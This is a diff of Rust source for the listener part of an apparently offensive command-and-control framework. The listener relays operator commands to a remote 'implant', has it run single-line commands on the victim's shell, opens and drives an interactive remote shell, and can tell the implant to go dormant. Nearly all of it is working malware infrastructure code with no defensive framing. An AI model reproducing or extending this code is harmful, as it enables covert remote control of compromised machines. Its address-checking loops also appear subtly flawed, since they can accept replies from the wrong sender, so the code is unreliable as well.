@@ -9,7 +9,6 @@ pub struct sysinfo {
     hostname: String,
 }
 
-
 pub struct Listener {
     pub udp_sock: Option<UdpSocket>,
     pub tcp_sock: Option<TcpListener>,
@@ -109,30 +108,73 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, relay: &mut UdpSocket) {
     println!("[+] Connection established by listener {}", lsn.id);
     let mut is_interacting: bool = false;
     loop {
-        // first check for client commands
-        let cc: u8 = rcv_client_command(lsn, relay);
-        match cc {
-            3 => break,
-            4 => {
-                let mut buffer = [0;2048];
-                let (_rbytes, relay_src) = relay.recv_from(&mut buffer).unwrap();
-                // replace the value of code here to whatever we decide should specify sending a one line command to the target
-                let code: u8 = 1;
+        // live interaction with the implant
+        if is_interacting {
+            let mut buffer = [0;2048];
+            let (rbytes, relay_src) = relay.recv_from(&mut buffer).unwrap();
+            // checks if client is terminating interaction with target_src
+            if rbytes == 1 && buffer[0] == 6 {
+                is_interacting = false;
+                let code: u8 = 3;
                 lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
+            }
+            // otherwise interact normally
+            else if rbytes != 0 {
+                // forward line to implant to execute on shell
                 lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&buffer[..], target);
+                // recieve output and send it back to the client
                 buffer = [0;2048];
-                let (_tbytes, target_src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
-                if target_src == target {
-                    relay.send_to(&buffer[..], relay_src);
+                let (mut tbytes, mut target_src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
+                while tbytes == 0 && target_src != target {
+                    // keep recieving data on socket until more than zero bytes are recieved from the correct address
+                    buffer = [0;2048];
+                    (tbytes, target_src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
                 }
-            },
-            5 => {
-                let code: u8 = 2;
-                lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
-            },
-            6 => is_interacting = true,
-            //7 => ,
-            _u8 => todo!(),
+                // forward output to client
+                relay.send_to(&buffer[..], relay_src);
+            }
+        }
+        else {
+            // check for client commands
+            let cc: u8 = rcv_client_command(lsn, relay);
+            match cc {
+                // go back to listening mode
+                3 => {
+                    // tell the implant to go dormant
+                    let code: u8 = 69;
+                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
+                    return;
+                },
+                // send a single line command to the implant to execute
+                4 => {
+                    // recieve the string as bytes from the client
+                    let mut buffer = [0;2048];
+                    let (_rbytes, relay_src) = relay.recv_from(&mut buffer).unwrap();
+                    // send control code to implant specifying single-line command execution
+                    let code: u8 = 1;
+                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
+                    // forward the command to the implant
+                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&buffer[..], target);
+                    // recieve the output from the implant
+                    buffer = [0;2048];
+                    let (mut tbytes, mut target_src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
+                    // forward output to client, making sure the network address of the implant is valid
+                    while tbytes == 0 && target_src != target {
+                        // keep recieving data on socket until more than zero bytes are recieved from the correct address
+                        buffer = [0;2048];
+                        (tbytes, target_src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
+                    }
+                    // forward output to client
+                    relay.send_to(&buffer[..], relay_src);
+                },
+                // tell implant to create a shell and begin interacting with it
+                5 => {
+                    is_interacting = true;
+                    let code: u8 = 2;
+                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
+                },
+                _u8 => todo!(),
+            }
         }
     }
 }
@@ -145,14 +187,13 @@ fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, relay: &mut UdpSocke
 // recieves a single byte from the client: the command code
 // this command code, represented as an integer, determines
 // what the client wants the listener to do
-// 0 => no command recieved, do nothing
+// anything not explicitly listed below => no command recieved, do nothing
 // 1 => send all information about the listener
 // 2 => stop listening
 // 3 => terminate anchovy connection
 // 4 => prepare to send_cmd to an anchovy
 // 5 => begin shell on anchovy
-// 6 => interact with shell on anchovy
-// 7 => terminate shell on anchovy
+// 6 => terminate shell on anchovy
 fn rcv_client_command(lsn: &mut Listener, relay: &mut UdpSocket) -> u8 {
     let mut buffer = [0; 1];
     let (_bytes, _src) = relay.recv_from(&mut buffer).unwrap();
@@ -171,7 +212,7 @@ pub fn get_lsn_info(lsn: &mut Listener) -> String {
         0 => stat = "Idle",
         1 => stat = "Listening",
         2 => stat = "Bound",
-        3_u8..=u8::MAX => todo!(),
+        _u8 => todo!(),
     }
     let id: u64 = lsn.id;
     let mut lsn_info = format!("Listener {id} :: Status - {stat}");
